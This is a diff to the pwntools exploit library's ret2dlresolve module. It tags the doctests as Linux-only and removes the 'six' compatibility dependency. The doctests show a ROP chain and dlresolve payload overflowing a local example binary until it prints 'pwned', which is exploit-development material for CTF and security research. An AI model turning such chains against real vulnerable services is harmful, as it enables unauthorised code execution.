@@ -32,9 +32,9 @@ We can automate the  process of exploitation with these some example binaries.
     0x0014:           0x2b84 [dlresolve index]
     0x0018:          b'gaaa' <return address>
     0x001c:        0x804ae24 arg0
-    >>> p = elf.process()
-    >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
-    >>> p.recvline()
+    >>> p = elf.process() # doctest: +LINUX
+    >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload})) # doctest: +LINUX
+    >>> p.recvline() # doctest: +LINUX
     b'pwned\n'
 
 You can also use ``Ret2dlresolve`` on AMD64:
@@ -56,16 +56,15 @@ You can also use ``Ret2dlresolve`` on AMD64:
     0x0038:         0x601e48 [arg0] rdi = 6299208
     0x0040:         0x4003e0 [plt_init] system
     0x0048:          0x15670 [dlresolve index]
-    >>> p = elf.process()
-    >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))
-    >>> if dlresolve.unreliable:
+    >>> p = elf.process() # doctest: +LINUX
+    >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload})) # doctest: +LINUX
+    >>> if dlresolve.unreliable: # doctest: +LINUX
     ...     p.poll(True) == -signal.SIGSEGV
     ... else:
     ...     p.recvline() == b'pwned\n'
     True
 """
 
-import six
 from copy import deepcopy
 
 from pwnlib.context import context
@@ -377,7 +376,7 @@ class Ret2dlresolvePayload(object):
             elif isinstance(top, bytes):
                 top = pack(self.data_addr + len(self.payload) + queue.size())
                 queue.append(MarkedBytes(queue[0]))
-            elif isinstance(top, six.integer_types):
+            elif isinstance(top, int):
                 top = pack(top)
 
             self.payload += top
